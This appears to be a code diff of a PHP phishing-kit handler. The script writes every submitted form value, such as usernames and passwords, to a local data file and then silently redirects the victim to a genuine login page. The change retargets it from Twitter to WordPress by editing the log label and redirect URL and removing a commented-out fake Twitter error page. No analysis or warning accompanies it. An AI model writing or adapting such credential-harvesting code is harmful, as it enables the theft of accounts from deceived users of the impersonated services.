@@ -19,6 +19,7 @@
 *
 */
 
+
 $path = getcwd();
 
 $path = substr($path,0,18);
@@ -26,7 +27,7 @@ $path = substr($path,0,18);
 $file = $path ."/export/data.txt";
 
 
-file_put_contents($file, print_r("\n\n\nTWITTER => Informations \n", true), FILE_APPEND);
+file_put_contents($file, print_r("\n\n\nWORDPRESS => Informations \n", true), FILE_APPEND);
 file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
 file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
@@ -34,24 +35,5 @@ file_put_contents($file, print_r("\n\n\n", true), FILE_APPEND);
 
 ?>
 
- <meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" /> 
+ <meta http-equiv="refresh" content="0; url=https://wordpress.com/log-in"/> 
 
-<!--
-
-<html>
-<head>
-
-<meta charset="utf-8">
-
-  <title>Twitter. It&#39;s what&#39;s happening.</title>      
-
-<link href="https://ma.twimg.com/twitter-mobile/96e6f6ff1a9d3e3acf6b4ee4ce320dd1474e81c1/images/favicon.ico" rel="icon" type="image/x-icon" />
-
-
-</head>
-<body style="background-image:url(\\css\\error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
-</body>
-</html>
-
-
--->
